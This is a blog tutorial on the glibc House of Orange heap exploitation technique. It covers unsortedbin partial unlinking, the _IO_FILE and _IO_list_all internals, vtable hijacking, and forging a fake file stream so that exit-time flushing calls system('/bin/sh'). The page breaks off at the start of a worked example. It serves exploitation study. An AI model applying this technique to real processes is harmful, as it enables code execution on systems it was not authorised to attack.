
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="HandheldFriendly" content="True" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="robots" content="noindex" />

  <!--  <link rel="manifest" href="/assets/site.webmanifest" crossorigin="use-credentials">-->

  <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&display=swap" rel="stylesheet">

    <link rel="stylesheet" type="text/css" href="http://localhost:1337/theme/stylesheet/style.min.css">

    <link id="dark-theme-style" rel="stylesheet" type="text/css"
          media="(prefers-color-scheme: dark), (prefers-color-scheme: no-preference)"
    href="http://localhost:1337/theme/stylesheet/dark-theme.min.css">

    <link id="pygments-dark-theme" rel="stylesheet" type="text/css"
              media="(prefers-color-scheme: dark), (prefers-color-scheme: no-preference)"
          href="http://localhost:1337/theme/pygments/monokai.min.css">
    <link id="pygments-light-theme" rel="stylesheet" type="text/css"
              media="(prefers-color-scheme: light)"
          href="http://localhost:1337/theme/pygments/emacs.min.css">


  <link rel="stylesheet"
        type="text/css"
        href="http://localhost:1337/theme/stork/stork.css" />

  <link rel="stylesheet" type="text/css" href="http://localhost:1337/theme/font-awesome/css/fontawesome.css">
  <link rel="stylesheet" type="text/css" href="http://localhost:1337/theme/font-awesome/css/brands.css">
  <link rel="stylesheet" type="text/css" href="http://localhost:1337/theme/font-awesome/css/solid.css">

        <link rel="stylesheet" type="text/css" href="http://localhost:1337/css/custom.css"> 
        <link rel="stylesheet" type="text/css" href="http://localhost:1337/css/zoom.css"> 
        <link rel="stylesheet" type="text/css" href="http://localhost:1337/css/collapsible-toc.css"> 
        <link rel="stylesheet" type="text/css" href="http://localhost:1337/css/goals.css"> 


      <script src="https://code.jquery.com/jquery-3.7.1.min.js" type="application/javascript"></script>
      <script src="https://cdn.jsdelivr.net/npm/dompurify@3.2.4/dist/purify.min.js" type="application/javascript"></script>
      <script src="http://localhost:1337/js/collapsible-toc.js" type="application/javascript"></script>
      <script src="http://localhost:1337/js/zoom.js" type="application/javascript"></script>
      <script src="http://localhost:1337/js/app.js" type="application/javascript"></script>
      <script src="http://localhost:1337/js/goals.js" type="application/javascript"></script>











 

<meta name="author" content="Jack69" />
<meta name="description" content="Unsortedbin Attack Chunks from unsorted bins are moved to two particular bins through a process known as sorting occurring when calling malloc(): smallbins: start right after the unsorted bins into memory layout largebins: start right after the smallbins into memory layout Smallbins are a collection of double-linked circular lists; there …" />
<meta name="keywords" content="">


  <meta property="og:site_name" content="Jack's Corner"/>
  <meta property="og:title" content="Heap Journey - House of Orange"/>
  <meta property="og:description" content="Unsortedbin Attack Chunks from unsorted bins are moved to two particular bins through a process known as sorting occurring when calling malloc(): smallbins: start right after the unsorted bins into memory layout largebins: start right after the smallbins into memory layout Smallbins are a collection of double-linked circular lists; there …"/>
  <meta property="og:locale" content="en_US"/>
  <meta property="og:url" content="http://localhost:1337/binary-exploitation/heap-journey/house-of-orange.html"/>
  <meta property="og:type" content="article"/>
  <meta property="article:published_time" content="2023-10-28 18:00:00+02:00"/>
  <meta property="article:modified_time" content=""/>
  <meta property="article:author" content="http://localhost:1337/author/jack69.html">
  <meta property="article:section" content="Binary Exploitation"/>
  <meta property="og:image" content="">

  <title>Jack's Corner &ndash; Heap Journey - House of Orange</title>


</head>
<body >

<aside>
  <div>
    <a href="http://localhost:1337/">
      <img src="http://localhost:1337/theme/img/profile.png" alt="Jack's Corner" title="Jack's Corner">
    </a>

    <h1>
      <a href="http://localhost:1337/">Jack's Corner</a>
    </h1>


    <div class="stork">
        <input class="stork-input" type="text" autocomplete="off" name="q" data-stork="sitesearch" placeholder="Search..." onclick=""/>
      <div class="stork-output" data-stork="sitesearch-output"></div>
    </div>


    <ul class="social">
      <li>
        <a class="sc-htb"
           href="https://app.hackthebox.com/profile/177323"
           target="_blank">
          <i class="fa-brands fa-htb"></i>
        </a>
      </li>
      <li>
        <a class="sc-thm"
           href="https://tryhackme.com/p/jack69"
           target="_blank">
          <i class="fa-brands fa-thm"></i>
        </a>
      </li>
    </ul>
  </div>
</aside>
  <main>

<nav>
  <a href="http://localhost:1337/">Home</a>

  <a href="/categories.html">Categories</a>
  <a href="/category/cheatsheet.html">Cheatsheets</a>
  <a href="/personal/goals.html">Goals</a>


</nav>

<article class="single">
  <header>
      
    <h1 id="binary-exploitation/heap-journey/house-of-orange">Heap Journey - House of Orange</h1>
    <p>

    </p>
  </header>


  <div>
        <div class="toc col-lg-3 hidden-xs hidden-sm">
            <div id="toc"><ul><li><a class="toc-href" href="#unsortedbin-attack" title="Unsortedbin Attack">Unsortedbin Attack</a><ul><li><a class="toc-href" href="#partial-unlinking" title="Partial Unlinking">Partial Unlinking</a></li></ul></li><li><a class="toc-href" href="#glibc-file-stream_1" title="GLIBC File Stream">GLIBC File Stream</a></li><li><a class="toc-href" href="#vtables-hijacking" title="vtables Hijacking">vtables Hijacking</a></li><li><a class="toc-href" href="#top-chunk-extension" title="Top Chunk Extension">Top Chunk Extension</a></li><li><a class="toc-href" href="#house-of-orange-technique" title="House of Orange Technique">House of Orange Technique</a><ul><li><a class="toc-href" href="#example-command-execution" title="Example: Command Execution">Example: Command Execution</a></li></ul></li></ul></div>
        </div>
    <h2 id="unsortedbin-attack">Unsortedbin Attack</h2>
<p>Chunks from unsorted bins are moved to two particular bins through a process known as <strong>sorting</strong> occurring when calling malloc():</p>
<ul>
<li>smallbins: start right after the unsorted bins into memory layout</li>
<li>largebins: start right after the smallbins into memory layout</li>
</ul>
<p><strong>Smallbins</strong> are a collection of double-linked circular lists; there are 62 smallbins which size goes from 0x20 to 0x3f0 (overlapping in part the fastbin sizes). They're similar to Fastbins; elements into each bin is process with FIFO policy and each bin retains a freed chunk of a particular size.</p>
<p><strong>Largebins</strong> are a collection of double-linked circular lists; its set of sizes consisting into <em>range of sizes</em> from 0x400 and up. It uses a <strong>skiplist</strong> (TODO).</p>
<p>The <strong>sorting</strong> process, resulting into a chunk being moved from the unsortedbin to a smallbin or a largebin, begins when malloc searches for a suitable chunk into unsortedbin whilst trying to serve a request for a size outside the tcache, fastbins or smallbins ranges (<a href="https://jackfromeast.site/2023-01/understand-the-heap-a-beautiful-mess.html">see there</a>), starting from the tail toward the head (following the bk_pointers chain):</p>
<ul>
<li>If there is a chunk larger than the one being allocated in the unsorted bins, it will be split, and the remaining chunk will be placed back in the unsorted bins. The remaining portion after the split is called the <strong>last remainder chunk</strong> <a href="http://localhost:1337/binary-exploitation/heap-journey/one-byte.html#remaindering">(see there)</a>. </li>
<li>If there is a chunk of the same size as the one being allocated, it will be returned and removed from the unsorted bins. </li>
<li>If a chunk in the unsorted bins is within the range of small bins in size, it will be placed at the head of the small bins. </li>
<li>If a chunk in the unsorted bins is within the range of large bins in size, it will be placed in a suitable position in the large bins. </li>
</ul>
<p><img alt="Sorting Process" src="/images/binary-exploitation/heap-journey/house-of-orange/sorting-process.png" title="Sorting Process"/></p>
<h3 id="partial-unlinking">Partial Unlinking</h3>
<p>The <strong>sorted</strong> (those moved to the small/large bins) or allocated chunk (those which fit the requested size) need to be unlinked from the unsortedbin; in this case malloc does not use the unlink macro:</p>
<ul>
<li>malloc knows in which bin the sorted or allocated chunk is</li>
<li>malloc knows which position in the bin it occupies</li>
</ul>
<p>The unlink process this time is referred as <strong>partial unlink</strong>:</p>
<ul>
<li>The allocator does not fully remove the chunk from the unsorted bin but rather updates the pointers in a way that effectively unlinks the chunk from the list.</li>
<li>Being the chunk to be unlinked always the last into the unsortedbin, its fd_pointer points to the unsortedbin starting address itself. After following the bk_pointer, the unsortedbin address will be copied to the fd of the previous chunk of that to be unlinked, as well as the unsortedbin head bk is updated with the bk of the chunk being unlinked.</li>
</ul>
<p><img alt="Partial Unlink" src="/images/binary-exploitation/heap-journey/house-of-orange/partial-unlink.png" title="Partial Unlink"/></p>
<p>Unsortedbin partial unlink are not subject to any integrity check in GLIBC versions prior the 2.28, making it a really interesting target.</p>
<p>An <strong>unsortedbin attack</strong> starts by overwriting a chunk bk_pointer. The basic idea is that when a chunks is subject to a partial unlink, malloc will follow the forged bk_pointer and copy the address of the unsortedbin to an arbitrary location.</p>
<ul>
<li>*Note: the allocator will copy the unsortedbin address where the fd_pointer of the chunk before the one being unlinked is supposed to be; it's important to consider this when forging the bk for the chunk that will be unlinked.</li>
</ul>
<p>It's important to take into account the side effect of the partial unlink:</p>
<ul>
<li>the (forged) bk address it's copied to the unsortedbin head bk</li>
</ul>
<p>This means that as malloc continues to scan the unsortedbin <strong>after sorting</strong> the victim chunk, it will follow the forged bk trying to determine if the chunk that is supposed to be there is suitable for satisfy the requested size; this could cause malloc to read unmapped memory generating general protection fault or trigger some sanity checks or mitigations.</p>
<p>One of the impacts of this attack is that of leaking the arena address; if the current arena corresponds to the main arena, also the libc address is leakable.</p>
<h2 id="glibc-file-stream_1">GLIBC File Stream</h2>
<p>When requesting access to a file on Linux, the process is issued with a <strong>file descriptor</strong> consisting into a positive integer used as an handle to a specific resource. 
GLIBC offers a wrapper for <strong>file descriptors</strong> to ease some more complex operation such as buffered I/O, undo, etc. </p>
<ul>
<li>These wrappers, the <strong>file streams</strong>, take the form of _IO_FILE struct.</li>
</ul>
<p>The _IO_FILE struct definition is the <a href="https://codebrowser.dev/glibc/glibc/libio/bits/types/struct_FILE.h.html">following</a>, in usr/include/bits/types/struct_FILE.h. </p>
<div class="highlight"><pre><span></span><code><span class="cm">/* The tag name of this struct is _IO_FILE to preserve historic</span>
<span class="cm">   C++ mangled names for functions taking FILE* arguments.</span>
<span class="cm">   That name should not be used in new code.  */</span>
<span class="k">struct</span><span class="w"> </span><span class="nc">_IO_FILE</span>
<span class="p">{</span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">_flags</span><span class="p">;</span><span class="w">       </span><span class="cm">/* High-order word is _IO_MAGIC; rest is flags. */</span>
<span class="w">  </span><span class="cm">/* The following pointers correspond to the C++ streambuf protocol. */</span>
<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">_IO_read_ptr</span><span class="p">;</span><span class="w">   </span><span class="cm">/* Current read pointer */</span>
<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">_IO_read_end</span><span class="p">;</span><span class="w">   </span><span class="cm">/* End of get area. */</span>
<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">_IO_read_base</span><span class="p">;</span><span class="w">  </span><span class="cm">/* Start of putback+get area. */</span>
<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">_IO_write_base</span><span class="p">;</span><span class="w"> </span><span class="cm">/* Start of put area. */</span>
<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">_IO_write_ptr</span><span class="p">;</span><span class="w">  </span><span class="cm">/* Current put pointer. */</span>
<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">_IO_write_end</span><span class="p">;</span><span class="w">  </span><span class="cm">/* End of put area. */</span>
<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">_IO_buf_base</span><span class="p">;</span><span class="w">   </span><span class="cm">/* Start of reserve area. */</span>
<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">_IO_buf_end</span><span class="p">;</span><span class="w">    </span><span class="cm">/* End of reserve area. */</span>
<span class="w">  </span><span class="cm">/* The follow:ng fields are used to support backing up and undo. */</span>
<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">_IO_save_base</span><span class="p">;</span><span class="w"> </span><span class="cm">/* Pointer to start of non-current get area. */</span>
<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">_IO_backup_base</span><span class="p">;</span><span class="w">  </span><span class="cm">/* Pointer to first valid character of backup area */</span>
<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">_IO_save_end</span><span class="p">;</span><span class="w"> </span><span class="cm">/* Pointer to end of non-current get area. */</span>
<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">_IO_marker</span><span class="w"> </span><span class="o">*</span><span class="n">_markers</span><span class="p">;</span>
<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">_IO_FILE</span><span class="w"> </span><span class="o">*</span><span class="n">_chain</span><span class="p">;</span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">_fileno</span><span class="p">;</span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">_flags2</span><span class="p">;</span>
<span class="w">  </span><span class="n">__off_t</span><span class="w"> </span><span class="n">_old_offset</span><span class="p">;</span><span class="w"> </span><span class="cm">/* This used to be _offset but it''s too small.  */</span>
<span class="w">  </span><span class="cm">/* 1+column number of pbase(); 0 is unknown. */</span>
<span class="w">  </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">short</span><span class="w"> </span><span class="n">_cur_column</span><span class="p">;</span>
<span class="w">  </span><span class="kt">signed</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="n">_vtable_offset</span><span class="p">;</span>
<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">_shortbuf</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
<span class="w">  </span><span class="n">_IO_lock_t</span><span class="w"> </span><span class="o">*</span><span class="n">_lock</span><span class="p">;</span>
<span class="cp">#ifdef _IO_USE_OLD_IO_FILE</span>
<span class="p">};</span>

<span class="k">struct</span><span class="w"> </span><span class="nc">_IO_FILE_complete</span>
<span class="p">{</span>
<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">_IO_FILE</span><span class="w"> </span><span class="n">_file</span><span class="p">;</span>
<span class="cp">#endif</span>
<span class="w">  </span><span class="n">__off64_t</span><span class="w"> </span><span class="n">_offset</span><span class="p">;</span>
<span class="w">  </span><span class="cm">/* Wide character stream stuff.  */</span>
<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">_IO_codecvt</span><span class="w"> </span><span class="o">*</span><span class="n">_codecvt</span><span class="p">;</span>
<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">_IO_wide_data</span><span class="w"> </span><span class="o">*</span><span class="n">_wide_data</span><span class="p">;</span>
<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">_IO_FILE</span><span class="w"> </span><span class="o">*</span><span class="n">_freeres_list</span><span class="p">;</span>
<span class="w">  </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">_freeres_buf</span><span class="p">;</span>
<span class="w">  </span><span class="kt">size_t</span><span class="w"> </span><span class="n">__pad5</span><span class="p">;</span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">_mode</span><span class="p">;</span>
<span class="w">  </span><span class="cm">/* Make sure we don't get into trouble again.  */</span>
<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">_unused2</span><span class="p">[</span><span class="mi">15</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">sizeof</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">4</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">sizeof</span><span class="w"> </span><span class="p">(</span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="k">sizeof</span><span class="w"> </span><span class="p">(</span><span class="kt">size_t</span><span class="p">)];</span>
<span class="p">};</span>


<span class="cm">/* These macros are used by bits/stdio.h and internal headers.  */</span>
<span class="cp">#define __getc_unlocked_body(_fp)                   \</span>
<span class="cp">  (__glibc_unlikely ((_fp)-&gt;_IO_read_ptr &gt;= (_fp)-&gt;_IO_read_end)    \</span>
<span class="cp">   ? __uflow (_fp) : *(unsigned char *) (_fp)-&gt;_IO_read_ptr++)it</span>
<span class="cp">#define __putc_unlocked_body(_ch, _fp)                  \</span>
<span class="cp">  (__glibc_unlikely ((_fp)-&gt;_IO_write_ptr &gt;= (_fp)-&gt;_IO_write_end)  \</span>
<span class="cp">   ? __overflow (_fp, (unsigned char) (_ch))                \</span>
<span class="cp">   : (unsigned char) (*(_fp)-&gt;_IO_write_ptr++ = (_ch)))</span>
<span class="cp">#define _IO_EOF_SEEN 0x0010</span>
<span class="cp">#define __feof_unlocked_body(_fp) (((_fp)-&gt;_flags &amp; _IO_EOF_SEEN) != 0)</span>
<span class="cp">#define _IO_ERR_SEEN 0x0020</span>
<span class="cp">#define __ferror_unlocked_body(_fp) (((_fp)-&gt;_flags &amp; _IO_ERR_SEEN) != 0)</span>
<span class="cp">#define _IO_USER_LOCK 0x8000</span>
<span class="cm">/* Many more flag bits are defined internally.  */</span>
<span class="cp">#endif</span>
</code></pre></div>
<p>It is typedef'ed as FILE in bits/types/struct_FILE.h:</p>
<div class="highlight"><pre><span></span><code><span class="nx">typedef</span><span class="w"> </span><span class="nx">struct</span><span class="w"> </span><span class="nx">_IO_FILE</span><span class="w"> </span><span class="nx">FILE</span><span class="p">;</span>
</code></pre></div>
<p>Some relevant struct members are:</p>
<ul>
<li><strong>int _flags</strong>: It determines the state of the file stream</li>
<li><strong>struct _IO_FILE *_chain</strong>: It's a pointer to another _IO_FILE struct; it forms a singly linked non-circular list of all the open file streams in a process</li>
<li><strong>int _fileno</strong>: Is the wrapped file descriptor</li>
<li>int _mode: can be used to disable the file stream</li>
<li>__overflow: macro used when flushing a file stream</li>
</ul>
<p>The head of the _IO_FILE chain is a symbol called <strong>_IO_list_all</strong>:</p>
<ul>
<li>every time a new file is opened (ex: fopen()), an _IO_FILE struct is created on the heap and is linked to the head of the _IO_list_all.</li>
</ul>
<p>The _IO_list_all is defined as pointer to a struct <strong>_IO_FILE_plus</strong>, which is a wrapper around the _IO_FILE struct itself adding a vtable pointer to it:</p>
<div class="highlight"><pre><span></span><code><span class="n">struct</span><span class="w"> </span><span class="n">_IO_FILE_plus</span>
<span class="p">{</span>
<span class="w">  </span><span class="n">_IO_FILE</span><span class="w"> </span><span class="n">file</span><span class="p">;</span>
<span class="w">  </span><span class="k">const</span><span class="w"> </span><span class="n">struct</span><span class="w"> </span><span class="n">_IO_jump_t</span><span class="w"> </span><span class="o">*</span><span class="n">vtable</span><span class="p">;</span>
<span class="p">};</span>
</code></pre></div>
<p>This pointer is generally used when GLIBC need to perform an operation involving all the open file streams, such as cleanup procedures.</p>
<ul>
<li>Such procedures are performed when the program exits (via GLIBC exit() or when returning from main()); each file stream in _IO_list_all is checked if needed to be flushed and, if it is, its <strong>__overflow</strong> member function is executed.</li>
</ul>
<p>The GLIBC function that is responsible for checking if to flush file streams is <strong>_IO_flush_all_lockp</strong>, called by the _IO_cleanup. When a file stream <em>fp</em> satisfies the check for flushing (see the code <a href="https://codebrowser.dev/glibc/glibc/libio/genops.c.html">below</a>), it's passed as argument to the _IO_OVERFLOW function, which performs the flushing itself.</p>
<div class="highlight"><pre><span></span><code><span class="nf">if</span><span class="w"> </span><span class="p">(((</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_mode</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">)</span>
<span class="w">       </span><span class="o">||</span><span class="w"> </span><span class="p">(</span><span class="n">_IO_vtable_offset</span><span class="w"> </span><span class="p">(</span><span class="n">fp</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span>
<span class="w">           </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_mode</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span>
<span class="w">                    </span><span class="o">&gt;</span><span class="w"> </span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">))</span>
<span class="w">       </span><span class="p">)</span>
<span class="w">      </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">_IO_OVERFLOW</span><span class="w"> </span><span class="p">(</span><span class="n">fp</span><span class="p">,</span><span class="w"> </span><span class="n">EOF</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">EOF</span><span class="p">)</span>
</code></pre></div>
<p>The _IO_OVERFLOW <strong>executes</strong> the __overflow member function for the file stream passed as argument. It's called only when at least one of the two checks in the OR condition is passed. The first one is the simpler to satisfy:</p>
<ul>
<li>(fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base): is passed when the file _mode is set to 0 or less and if anything remains to be written in the file stream buffer (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base) before it's closed.</li>
</ul>
<h2 id="vtables-hijacking">vtables Hijacking</h2>
<p><strong>vtables</strong>: mechanism to implement polymorphism in Object-Oriented languages like C++. It is a table of functions retained by each class, containing the overrides of parent's virtual methods.</p>
<ul>
<li>A typical object-oriented language (ex: C++) type of attack targeting the vtables is the <strong>vtable Hijacking</strong>. It consists into make a class/object use a fake vtable containing evil methods to perform mischievous actions (generally, invoking a shell), typically by exploiting an overflow bug. </li>
</ul>
<p>GNU C++ library re-uses some of the C library's low level functionality rather than re-implementing. That's the reason the vtables are present into GLIBC.</p>
<ul>
<li>Being new file streams created on the heap, they (their vtables) are potentially vulnerable to heap exploitation techniques</li>
</ul>
<p>Each process has at least three open file streams, so, even though a binary does not create a new file stream, it's still vulnerable to file streams attacks:</p>
<ul>
<li>stdin</li>
<li>stdout</li>
<li>stderr</li>
</ul>
<h2 id="top-chunk-extension">Top Chunk Extension</h2>
<p>When malloc receives a request too large to be serviced from an arena top chunks, it will try to extend the arena memory.</p>
<ul>
<li>"Normal" arenas achieve this by changing the permissions on pre-mapped heap memory</li>
<li>The main arena invokes the brk() syscall to request more memory from the kernel</li>
</ul>
<p>After the kernel gives a new portion of memory, malloc uses the top chunk size field to determine whether the new memory is contiguous to the end of the heap.</p>
<ul>
<li>If it's contiguous, malloc extends the top chunk and performs the requested chunk allocation, previously too large</li>
<li>If not, malloc assumes that the kernel was unable to map contiguous memory for this heap. This can happen when it runs out of space.</li>
</ul>
<p>In the second case, the new memory space is used as a new heap by updating the top chunk pointer to the new memory area and freeing the old top chunk.</p>
<p>There is a consistency check in the sysmalloc() function; this function is responsible for requesting memory from the kernel (by invoking the brk() syscall) (<a href="https://github.com/lattera/glibc/blob/master/malloc/malloc.c">see there</a>):</p>
<div class="highlight"><pre><span></span><code><span class="w">  </span><span class="o">/*</span><span class="w"> </span><span class="n">Record</span><span class="w"> </span><span class="n">incoming</span><span class="w"> </span><span class="n">configuration</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">top</span><span class="w"> </span><span class="o">*/</span>

<span class="w">  </span><span class="n">old_top</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="n">av</span><span class="o">-&gt;</span><span class="n">top</span><span class="p">;</span>
<span class="w">  </span><span class="n">old_size</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="n">chunksize</span><span class="w"> </span><span class="p">(</span><span class="n">old_top</span><span class="p">);</span>
<span class="w">  </span><span class="n">old_end</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="p">(</span><span class="nb">char</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="n">chunk_at_offset</span><span class="w"> </span><span class="p">(</span><span class="n">old_top</span><span class="p">,</span><span class="w"> </span><span class="n">old_size</span><span class="p">));</span>

<span class="w">  </span><span class="o">/*</span>
<span class="w">     </span><span class="n">If</span><span class="w"> </span><span class="n">not</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">first</span><span class="w"> </span><span class="n">time</span><span class="w"> </span><span class="n">through</span><span class="p">,</span><span class="w"> </span><span class="n">we</span><span class="w"> </span><span class="n">require</span><span class="w"> </span><span class="n">old_size</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">be</span>
<span class="w">     </span><span class="n">at</span><span class="w"> </span><span class="n">least</span><span class="w"> </span><span class="n">MINSIZE</span><span class="w"> </span><span class="nb">and</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">have</span><span class="w"> </span><span class="n">prev_inuse</span><span class="w"> </span><span class="k">set</span><span class="p">.</span>
<span class="w">   </span><span class="o">*/</span>

<span class="w">  </span><span class="n">assert</span><span class="w"> </span><span class="p">((</span><span class="n">old_top</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">initial_top</span><span class="w"> </span><span class="p">(</span><span class="n">av</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">old_size</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="o">||</span>
<span class="w">          </span><span class="p">((</span><span class="n">unsigned</span><span class="w"> </span><span class="n">long</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="n">old_size</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;</span><span class="p">=</span><span class="w"> </span><span class="n">MINSIZE</span><span class="w"> </span><span class="o">&amp;&amp;</span>
<span class="w">           </span><span class="n">prev_inuse</span><span class="w"> </span><span class="p">(</span><span class="n">old_top</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span>
<span class="w">           </span><span class="p">((</span><span class="n">unsigned</span><span class="w"> </span><span class="n">long</span><span class="p">)</span><span class="w"> </span><span class="n">old_end</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="p">(</span><span class="n">pagesize</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="p">))</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">));</span>
</code></pre></div>
<ul>
<li>(old_top == initial_top (av) &amp;&amp; old_size == 0): it's satisfied only the first time sysmalloc is invoked; it checks, in fact, that it's the first time it's invoked</li>
<li>((unsigned long) (old_size) &gt;= MINSIZE &amp;&amp; prev_inuse (old_top) &amp;&amp; ((unsigned long) old_end &amp; (pagesize - 1)) == 0): <ul>
<li>the size of the old top chunk (old_size) is at least equal to a MINSIZE constant</li>
<li>the prev_inuse is set for the old top chunk</li>
<li>the old top chunk chunk ends (old_end) on a page boundary</li>
</ul>
</li>
</ul>
<p>Note: at the end of the "old" heap that has no longer a top chunk, a "fencepost" chunk with the (illegal) size of 0x10 is placed; this is used to allow an eventual forward consolidation avoiding to reading unmapped memory.</p>
<h2 id="house-of-orange-technique">House of Orange Technique</h2>
<p>Developed in 2016 by Angelboy manly designed to drop a shell. It's formed by three phases:</p>
<ul>
<li>Phase 1 - Find a bug that allows to have some level of control on the heap, generally an heap overflow and adding a chunk to the unsortedbin</li>
<li>Phase 2 - Unsortedbin Attack </li>
<li>Phase 3 - Dropping a shell: uses a file stream-exploitation (or file stream-oriented programming).</li>
</ul>
<p>A classic House of Orange attack aims to drop a shell by exploiting a file stream vulnerability:</p>
<p>A possibility is to target one of the standard I/O vtable pointers through a <strong>vtable hijacking</strong> attack; this would be realized by the unsortedbin attack, replacing the vtable pointer with the address of the unsortedbin in the main arena. If that's the case, the main arena (starting from the unsortedbin address) would be treated as a vtable.</p>
<ul>
<li>This could be useful to performs some arbitrary writes into the main arena but if the main arena consists primarily of lists (bins) and eventual pointers they contain, this attack is not so useful since, being the main area a non-executable memory area, trying executing these address would generate general protection faults.</li>
</ul>
<p>Another more interesting possibility is to target the <strong>_IO_list_all pointer</strong>. Forging a fake file stream into this list would make possible to control the trigger of the <strong>overflow</strong> function the moment the program exits and the GLIBC implementation checks for file streams to be flushed iterating on the _IO_list_all pointer.</p>
<p>Using the unsortedbin attack to overwrite the _IO_list_all pointer (which points to the head of the file stream chain), the main arena would be treated as a file stream as specified by the _IO_FILE_plus struct with the ability to control the fields defined within it.</p>
<p>Forging an ad-hoc chunk, using for example a one gadget in the address pointed by the __overflow member function, that passes the flushing check would lead to a code execution.</p>
<p>An alternative to the one gadget is to take advantage of the _flags _IO_FILE field. Since when the __overflow function is called, its first argument is the address of the file stream it's being called from, overwriting the first quadword of the fake file stream (where the _flags filed resides), will result into passing the first quadword content as parameter to the function pointed by the __overflow:</p>
<ul>
<li>Setting __overflow = GLIBC system@ and _flags = "\bin\sh\0" would result in executing system("\bin\sh")</li>
</ul>
<p>The __overflow method is overridden through vtable hijacking, forging an ad-hoc vtable contained into the fake file stream (the free chunk i.e the old top chunk).</p>
<h3 id="example-command-execution">Example: Command Execution</h3>
<p>From Udemy course "Linux Heap Exploitation - Part 1", the binary <em>house_of_orange</em> is vulnerable to this heap exploitation technique.</p>
<p>The particularity with this binary is that event though it's possible to perform an heap overflow, satisfying the first house of orange prerequisite (phase 1), it's not possible to call the free() method so that the Unsortedbin attack (phase 2) could not be realizable, in theory.</p>
<ul>
